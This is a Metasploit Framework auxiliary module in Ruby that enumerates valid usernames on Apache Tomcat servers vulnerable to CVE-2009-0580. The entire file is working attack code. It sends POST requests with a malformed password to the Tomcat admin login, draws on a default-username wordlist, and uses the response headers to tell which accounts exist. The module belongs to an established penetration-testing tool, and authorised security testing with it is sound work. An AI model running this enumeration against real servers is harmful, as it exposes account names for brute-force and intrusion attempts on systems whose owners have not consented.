##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'           => 'Apache Tomcat User Enumeration',
			'Description'    => %q{
					Apache Tomcat user enumeration utility, for Apache Tomcat servers prior to version
				6.0.20, 5.5.28, and 4.1.40.
			},
			'Author'         =>
				[
					'Alligator Security Team',
					'Heyder Andrade <heyder.andrade[at]gmail.com>',
					'Leandro Oliveira <leandrofernando[at]gmail.com>'
				],
			'References'     =>
				[
					['BID', '35196'],
					['CVE', '2009-0580'],
					['OSVDB', '55055'],
				],
			'License'        =>  MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('URI', [true, 'The path of the Apache Tomcat Administration page', '/admin/j_security_check']),
				OptPath.new('USER_FILE',  [ true, "File containing users, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_users.txt") ]),
			], self.class)

		deregister_options('PASSWORD','PASS_FILE','USERPASS_FILE','USER_AS_PASS','STOP_ON_SUCCESS','BLANK_PASSWORDS','USERNAME')
	end

	def target_url
		uri = normalize_uri(datastore['URI'])
		"http://#{vhost}:#{rport}#{uri}"
	end

	def run_host(ip)
		@users_found = {}

		each_user_pass { |user,pass|
			do_login(user)
		}

		if(@users_found.empty?)
			print_status("#{target_url} - No users found.")
		else
			print_good("#{target_url} - Users found: #{@users_found.keys.sort.join(", ")}")
			report_note(
				:host => rhost,
				:port => rport,
				:type => 'tomcat.users',
				:data => {:users =>  @users_found.keys.join(", ")}
			)
		end
	end

	def do_login(user)
		post_data = "j_username=#{user}&password=%"
		vprint_status("#{target_url} - Apache Tomcat - Trying name: '#{user}'")
		begin
			res = send_request_cgi(
				{
					'method'  => 'POST',
					'uri'     => normalize_uri(datastore['URI']),
					'data'    => post_data,
				}, 20)

			if res
				if res.code == 200
					if res.headers['Set-Cookie']
						vprint_status("#{target_url} - Apache Tomcat #{user} not found ")
					else
						print_good("#{target_url} - Apache Tomcat #{user} found ")
						@users_found[user] = :reported
					end
				end
			else
				print_error("#{target_url} - NOT VULNERABLE")
				return :abort
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
			print_error("#{target_url} - UNREACHABLE")
			return :abort
		end
	end

end
